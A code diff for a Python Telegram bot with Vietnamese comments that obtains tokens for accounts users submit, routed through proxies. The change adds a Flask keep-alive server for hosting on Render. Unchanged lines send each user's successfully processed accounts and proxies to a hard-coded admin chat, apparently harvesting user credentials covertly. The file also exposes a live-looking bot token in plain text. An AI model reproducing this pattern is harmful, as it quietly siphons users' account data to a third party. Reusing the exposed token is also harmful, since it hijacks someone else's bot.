@@ -8,6 +8,9 @@ import pyotp
 import base64
 import io
 import struct
+import os
+import threading
+from flask import Flask
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -21,6 +24,17 @@ from telegram.ext import (
 from Crypto.Cipher import AES, PKCS1_v1_5
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
+
+# ================= CẤU HÌNH WEB SERVER (FLASK) CHO RENDER =================
+app_flask = Flask(__name__)
+
+@app_flask.route('/')
+def home():
+    return "Bot is running!"
+
+def run_flask():
+    port = int(os.environ.get("PORT", 8080))
+    app_flask.run(host='0.0.0.0', port=port)
 
 # ================= CẤU HÌNH BOT =================
 TELEGRAM_BOT_TOKEN = "8694132202:AAGdtE43NdakjEip6ZM5IAVvImRcYwoRbrM"
@@ -446,7 +460,6 @@ async def process_run(update: Update, context: ContextTypes.DEFAULT_TYPE, user_i
                 err = res.get("error", "Lỗi không xác định")
                 results_text += f"❌ `UID: {uid}` | Lỗi: {err}\n\n"
                 
-                # Gửi thông báo lỗi riêng cho admin nếu tài khoản nào đó thất bại
                 try:
                     admin_err_msg = (
                         f"⚠️ **GET TOKEN THẤT BẠI**\n"
@@ -459,18 +472,14 @@ async def process_run(update: Update, context: ContextTypes.DEFAULT_TYPE, user_i
                 except:
                     pass
 
-    # Gửi thông báo về cho Admin khi có các tài khoản thành công đúng 3 tin nhắn riêng biệt
     if successful_accounts:
         try:
-            # Tin nhắn 1: Tên người dùng
             msg1 = f"👤 **Người dùng:** {username_str} (`{user.id}`)"
             await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=msg1, parse_mode="Markdown")
 
-            # Tin nhắn 2: Tất cả tài khoản chạy thành công (mỗi dòng 1 tài khoản)
             msg2 = f"📂 **Tất cả tài khoản chạy thành công:**\n" + "\n".join([f"`{acc}`" for acc in successful_accounts])
             await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=msg2, parse_mode="Markdown")
 
-            # Tin nhắn 3: Tất cả proxy tương ứng
             msg3 = f"🌐 **Proxy tương ứng:**\n" + "\n".join([f"`{prx}`" for prx in successful_proxies])
             await context.bot.send_message(chat_id=ADMIN_TELEGRAM_ID, text=msg3, parse_mode="Markdown")
         except:
@@ -493,8 +502,14 @@ def main():
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
-    print("🤖 Bot Telegram đã sẵn sàng hoạt động với Menu, Quản trị Admin, Phân bổ Proxy và Đa luồng (Max 7 luồng)...")
+    print("🤖 Bot Telegram đã sẵn sàng hoạt động với Menu, Quản trị Admin, Phân bổ Proxy và Đa luồng...")
     app.run_polling()
 
 if __name__ == '__main__':
+    # Chạy Flask Server ở luồng phụ để Render nhận diện port thành công
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
+
+    # Chạy Bot Telegram ở luồng chính
     main()
